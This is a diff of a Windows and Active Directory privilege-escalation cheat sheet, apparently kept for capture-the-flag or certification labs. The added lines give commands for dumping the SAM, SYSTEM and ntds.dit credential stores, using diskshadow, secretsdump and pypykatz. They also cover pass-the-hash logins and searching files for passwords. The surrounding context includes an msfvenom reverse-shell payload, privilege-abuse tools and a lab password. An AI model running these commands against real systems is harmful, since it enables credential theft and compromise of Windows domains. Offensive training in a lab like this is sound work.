@@ -12,6 +12,9 @@ There are several key pieces of information we should always obtain:
 - Installed applications
 - Running processes
 
+https://github.com/lkarlslund/Adalanche/releases
+
+
 ```bash
 > powershell -ep bypass
 > whoami
@@ -62,8 +65,9 @@ There are several key pieces of information we should always obtain:
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
+> Get-ChildItem -Path C:\Users -Include user.txt,root.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
-> findstr /i /s "*print_service*" *.txt,*.config,*.log
+> findstr /is "passwordss" *.txt *.config *.log *.xml *.docx *.xls
 > Get-History
 > (Get-PSReadlineOption).HistorySavePath
 > LOOK IN THE EVENT VIEWER FOR PASSWORDS # should go to Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational then search more . Apply filter for 4104 events , should appear in top 5
@@ -221,7 +225,7 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
 > Invoke-BloodHound -CollectionMethod All $ip -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "dev04-leon" # May take a couple minutes
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "crissie"
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Tasks\ -OutputPrefix "bum"
 # Or remotely
 > bloodhound-python --dns-tcp -d support.htb -u ldap -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" -c all -ns $ip 
 > python bloodhound.py --dns-tcp -d $dom -u enox -p california -c all -ns $ip
@@ -413,9 +417,15 @@ Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Re
 
 #### SAM and SYSTEM Files
 
-Always check the SAM if there's any sort of backup or loose permissions in SMB. If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystemm:
+Always check the SAM if there's any sort of backup or loose permissions in SMB. If you're ever able to run into the SAM or SYSTEM files in Windows smb or filesystem:
+They are typically located in "C:\Windows\System32\config".
 
 ```bash
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+
 reg save hklm\security c:\security
 reg save hklm\sam c:\sam
 reg save hklm\system c:\system
@@ -448,6 +458,8 @@ samdump2 SYSTEM SAM
 
 ./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
 Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+evil-winrm -i $dc -u $user -H $hash
 ```
 
 This will provide hashes that you will be able to crack.
@@ -928,7 +940,7 @@ Identifying.
 
 ```bash
 # Check what binaries are running, as before
-Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Get-CimInstance -ClassName win32_service | Select * | Where-Object {$_.State -like 'Running'}
 # Check for permissions on the binary if you find an interesting one
 icacls .\Documents\BetaServ.exe
 ```
@@ -1188,7 +1200,7 @@ kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 #### Whenever you get a Shell
 
 ```bash
-Start-Process -NoNewWindow -FilePath C:\Windows\Tools\shell.exe
+Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
 ```
 
 #### UAC Bypass
@@ -1838,6 +1850,32 @@ reg save hklm\system c:\Temp\system
 cd Temp
 download sam
 download system
+
+secretsdump.py -sam sam -system system local
+```
+
+If that isn't good enough..
+
+```bash
+mkdir c:\temp
+cd c:\temp
+
+### back_script.txt
+set verbose on 
+set metadata C:\Windows\Temp\meta.cab 
+set context clientaccessible 
+set context persistent 
+begin backup 
+add volume C: alias cdrive 
+create 
+expose %cdrive% E: 
+end backup 
+###
+
+diskshadow /s back_script.txt
+robocopy /b E:\Windows\ntds . ntds.dit
+
+secretsdump.py -ntds ntds.dit -system system local 
 ```
 
 #### SeRestorePrivilege
@@ -1847,6 +1885,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 EXITFUNC=th
 upload binary.exe
 sudo nc -lvnp 80
 .\SeRestoreAbuse.exe "cmd /c C:\windows\tasks\binary.exe"
+
+.\EnableSeRestorePrivilege.ps1
+if access to RDP and C:\Windows\System32 then you an do the utilman exploit.
 ```
 
 #### Exploiting Service Operators Group Membership
@@ -1988,3 +2029,9 @@ put test.lnk
 #### Kerberos and Certificates
 
 "https://github.com/nturley3/zeek-kerberos-haters-guide"
+
+#### Extract Hashes from LSASS Dump
+
+```bash
+pypykatz lsa minidump lsass.DMP
+```
